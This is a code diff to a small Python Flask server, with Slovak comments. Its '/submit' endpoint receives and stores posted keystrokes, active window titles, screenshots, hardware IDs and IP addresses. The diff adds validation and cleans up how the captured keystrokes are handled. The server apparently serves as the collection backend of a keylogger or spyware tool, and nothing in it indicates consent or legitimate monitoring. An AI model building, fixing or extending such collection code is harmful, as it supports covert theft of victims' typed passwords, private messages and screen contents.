@@ -12,21 +12,31 @@ def home():
 @app.route('/submit', methods=['POST'])
 def submit():
     json_data = request.json
-    print("Received data:", json_data)  # log pre debug
+    if not json_data:
+        return {"status": "error", "message": "No JSON data received"}, 400
 
-    # Debug výpisy
-    print("Keys:", json_data.get('keys'))
-    print("Active window:", json_data.get('active_window'))
-    print("Screenshot: received" if json_data.get('screenshot') else "Screenshot: missing")
+    keys_value = json_data.get('keys')
+
+    # Oprava: Ak náhodou keys_value je callable (metóda), prekonvertuj na string
+    if callable(keys_value):
+        keys_value = str(keys_value)
+
+    # Alebo lepšie, kontroluj typ, nech je to string (bez metód)
+    if not isinstance(keys_value, str):
+        keys_value = str(keys_value) if keys_value is not None else ""
+
+    print(f"Received keys (type {type(keys_value)}): {keys_value}")
+    print(f"Active window: {json_data.get('active_window')}")
+    print("Screenshot received" if json_data.get('screenshot') else "Screenshot missing")
 
     entry = {
         'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         'user_id': json_data.get('user_id', 'N/A'),
         'hwid': json_data.get('hwid', 'N/A'),
         'ip_address': json_data.get('ip_address', 'N/A'),
-        'keys': json_data.get('keys', 'N/A'),
+        'keys': keys_value,
         'active_window': json_data.get('active_window', 'N/A'),
-        'screenshot': json_data.get('screenshot')  # pridané!
+        'screenshot': json_data.get('screenshot')
     }
     DATA.append(entry)
 
